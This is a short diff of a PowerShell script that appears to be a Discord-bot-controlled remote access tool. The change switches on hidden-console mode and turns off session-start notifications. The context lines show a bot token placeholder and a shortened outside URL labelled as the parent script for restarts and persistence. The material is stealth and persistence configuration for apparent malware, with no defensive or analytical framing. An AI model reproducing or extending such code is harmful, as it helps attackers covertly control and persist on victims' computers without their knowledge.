@@ -21,9 +21,9 @@
 $global:token = "$tk" # make sure your bot is in ONE server only
 # =============================================================== SCRIPT SETUP =========================================================================
 
-$HideConsole = 0 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-$spawnChannels = 1 # Create new channel on session start
-$InfoOnConnect = 1 # Generate client info message on session start
+$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$spawnChannels = 0 # Create new channel on session start
+$InfoOnConnect = 0 # Generate client info message on session start
 $defaultstart = 0 # Option to start all jobs automatically upon running
 $global:parent = "https://is.gd/zbAlVN" # parent script URL (for restarts and persistance)
 
